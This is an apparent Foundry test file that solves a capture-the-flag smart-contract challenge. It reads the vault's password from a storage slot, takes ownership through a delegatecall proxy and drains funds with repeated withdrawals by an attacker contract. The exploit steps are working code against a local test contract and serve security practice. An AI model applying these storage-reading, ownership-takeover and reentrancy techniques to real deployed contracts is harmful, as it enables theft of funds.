// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "src/VaultAttacker.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address player = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(player, 1 ether);
        VaultAttacker attacker = new VaultAttacker(payable(address(vault)));
        vm.startPrank(player);

        // add your hacker code.
        //==== get owner password
        // read slot1 from vault
        bytes32 slotIndex = bytes32(uint256(1));
        bytes32 pswdValue = vm.load(address(vault), slotIndex); // slot1: VaultLogic logic

        //==== change owner password to player's
        //bytes32 data = abi.encodeWithSignature("changeOwner(bytes32,address)", pswdValue, player);
        VaultLogic(address(vault)).changeOwner(pswdValue, address(attacker));

        //==== replay attack
        // deposit eth
        vm.deal(address(attacker), 1 ether);
        attacker.deposit(0.001 ether);
        attacker.opWithdraw();
        attacker.withdrawReplay();
        console.logUint(address(vault).balance);
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
